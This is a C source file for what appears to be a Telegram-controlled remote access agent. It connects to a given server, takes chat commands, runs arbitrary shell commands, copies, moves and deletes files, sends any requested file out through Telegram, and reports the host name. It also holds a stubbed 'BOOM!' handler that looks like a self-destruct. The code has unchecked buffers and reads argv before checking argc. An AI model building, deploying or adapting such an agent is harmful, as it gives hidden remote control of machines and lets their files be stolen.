#include "include/common.h"
#include "Telegram/telegram.h"
#include "Telegram/common.h"
#include "include/util.h"


#include<sys/socket.h>
#include<arpa/inet.h> //inet_addr
#include <sys/stat.h>

#define OP_START '\\x02'
#define OP_STOP "\x03"



void changecommand(char *id,char *text,char *pName);


int main(int argc , char *argv[])
{
    int socket_desc, index = 0, index1 = 0, potnumber_client;
    char message[2000], server_reply[2000], word_copy_message[150];
    struct sockaddr_in server;

    char arg[100];
    strcpy(arg, argv[0]);
    potnumber_client = atoi(argv[2]);
    memset(word_copy_message, 0, 150);

    //Create socket
    //If cannot create socket it return value of socket_desc valuable = -1
    socket_desc = socket(AF_INET , SOCK_STREAM , 0);

    if (3 != argc) {
        fprintf(stderr, "Usage: %s <server> <port>\n", argv[0]);
        exit(1);

    }

    if (socket_desc == -1)
    {
        printf("Could not create socket");
    
    }
         
    server.sin_addr.s_addr = inet_addr(argv[1]);
    server.sin_family = AF_INET;
    server.sin_port = htons(potnumber_client);
 
    //Connect to remote server
    //If cannot connect to server it return value of (connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) < 0 and end program
    while(1) {
        socket_desc = socket(AF_INET , SOCK_STREAM , 0);
        server.sin_addr.s_addr = inet_addr(argv[1]);
        server.sin_family = AF_INET;
        server.sin_port = htons(potnumber_client);  
        if(connect(socket_desc , (struct sockaddr *)&server , sizeof(server)) >= 0) {
            printf("Connected\n");
            break;
        } else {
            printf("Try to connected\n");
            usleep(3000000);
        }
    }

    char chat_id[60];
    char chat_text[4098];
    char buf[3];
    char status[3];
    int status_len;
    while(1){
        bzero(chat_id,sizeof(chat_id));
        bzero(chat_text,sizeof(chat_text));
        bzero(buf,sizeof(buf));
        bzero(status,sizeof(status));

        //Check status
        while(1){
            write(socket_desc, "1", 1);
            while((status_len = recv(socket_desc, status , 3, 0)) > 0)
            {
                status[status_len] = '\0';
                if(strlen(status) > 0){
                    break;
                }
            }
            if(strcmp(status, "1") == 0){
                break;
            }
            sleep(3);
        }

        if(read(socket_desc, chat_id , 50) < 0){
            printf("chat_id failed\n");
            // perror("chat_id");
        }
        printf("%s\n",chat_id);
        if( read(socket_desc, chat_text , sizeof(chat_text) ) < 0)
        {
            printf("recieve failed");
        }
        // if( write(socket_desc,buf,3) < 0){
        //     printf("writing failed");
        // }
        if(strlen(chat_id) < 1) continue;
        // printf("Ez here\n");
        printf("%s\n",chat_text);
       
        // printf("b4 changecmd\n");
        changecommand(chat_id,chat_text,argv[0]);
        // printf("af changecmd\n");
        
        // printf("%s\n", chat_text);
        //combine all message_box
        FILE *fp, *error_file, *exe_file;
        fp = popen("touch result.txt","r");
        fp = popen("touch error.txt","r");
        telegram_send_act(chat_id, "typing");
        // usleep(10000);
        sleep(1);
        char buf[2000], msg[2010];
        bzero(buf,1999);
        exe_file = fopen("result.txt","r");

        fseek(exe_file, 0, SEEK_END);
        int result_len = ftell(exe_file);
        rewind(exe_file);

        fclose(exe_file);

        if(result_len == 0)
        {
            error_file = fopen("error.txt","r");        
            if(error_file != NULL)
            {
                while(!feof(error_file)){
                    memset(buf, 0, sizeof(buf));
                    int bufflen = fread(buf, 1, sizeof(buf), error_file);
                    buf[bufflen] = 0;
                }
                
            }
            fclose(error_file);
            
            if(strlen(buf) <= 0){
                strcpy(buf, "No output");
            }

            printf("Null\n");
            sprintf(msg, "```\n%s\n```", buf);
            telegram_send_act(chat_id, "typing");
            telegram_send_msg(chat_id, msg);
            printf("%s\n", buf);
            bzero(buf,1999);
        }
        else if(result_len < 1024)
        {
            exe_file = fopen("result.txt", "r");
            if(exe_file != NULL){
                while(!feof(exe_file)){
                    memset(buf, 0, sizeof(buf));
                    int bufflen = fread(buf, 1, sizeof(buf), exe_file);
                    buf[bufflen] = 0;
                }
            }
            fclose(exe_file);

            // printf("Yeah!\n");
            // fgets(buf, 1024, fp);
            //If write(socket_desc , buf , strlen(buf)) < 0 it means client didn't send anything to server
            sprintf(msg, "```\n%s\n```", buf);
            telegram_send_act(chat_id, "typing");
            telegram_send_msg(chat_id, msg);
            printf("%s\n", buf);
            bzero(buf,1999);

        }
        else{
            //sending_exe.log
            telegram_send_act(chat_id, "upload_document");
            telegram_send_file(chat_id, "result.txt");
            printf("send result.txt\n");
        }
        // printf("wow");
        
        fp = popen("rm result.txt","r");
        fp = popen("rm error.txt","r");
    }
}
void changecommand(char *id,char *text,char *pName) {
    char text_build[4000], command[4000],cmdArg[4000];
    char path[4000];
    int start_index, index = 0, length;
    int space_loc;
    bzero(command,4000);
    bzero(cmdArg,4000);
    // printf("b4 getpath\n");
    getNowPath(path);
    getpName(pName);
    strcpy(text_build, text);
    length = strlen(text);
    for(start_index=0; start_index < length; start_index++) {
        if(text_build[start_index] == ' ' ){
            space_loc = start_index;
            break;
        }
    }
    // printf("b4 cut string\n");
    strncpy(command,text_build+1,space_loc);
    command[space_loc-1] = '\0';
    printf("%s\n",command);
    strncpy(cmdArg, text_build+space_loc,length-space_loc);
    cmdArg[length-space_loc] = '\0';
    // printf("%s",cmdArg);
    if(strlen(cmdArg) > 0){
        printf("%s",cmdArg);
    }
    bzero(text_build,4000);
    if(strcmp(command, "shell") == 0)
    {
        sprintf(text_build, "%s",cmdArg);
        exeCMD(text_build);
        // strcpy(command_detail, "Exec shell commands with timeout.");
    }
    else if(strcmp(command, "timeout") == 0)
    {
        // Setting timeout for exeCMD;
        //ADD Later
    }
    else if(strcmp(command, "cp") == 0)
    {
        sprintf(text_build, "%s%s",command,cmdArg);
        exeCMD(text_build);
        // strcpy(command_detail, "Exec shell commands with timeout.");
    }
    else if(strcmp(command, "mv") == 0)
    {
        sprintf(text_build, "%s%s",command,cmdArg);
        exeCMD(text_build);
        // strcpy(command_detail, "Exec shell commands with timeout.");
    }
    else if(strcmp(command, "rm") == 0)
    {
        sprintf(text_build, "%s%s",command,cmdArg);
        exeCMD(text_build);
        // strcpy(command_detail, "Exec shell commands with timeout.");
    }
    else if(strcmp(command, "mkdir") == 0)
    {
        sprintf(text_build, "%s%s",command,cmdArg);
        exeCMD(text_build);
        // strcpy(command_detail, "Exec shell commands with timeout.");
    }
    else if(strcmp(command, "getfile") == 0)
    {
        telegram_send_file(id,cmdArg);
        // strcpy(command_detail, "Exec shell commands with timeout.");
    }
    else if(strcmp(command, "BOOM!") == 0)
    {
        // boom(path,pName);
    }
    else if(strcmp(command, "gethostname") == 0) {
        getHostname(text_build);
        telegram_send_msg(id,text_build);
    }

}


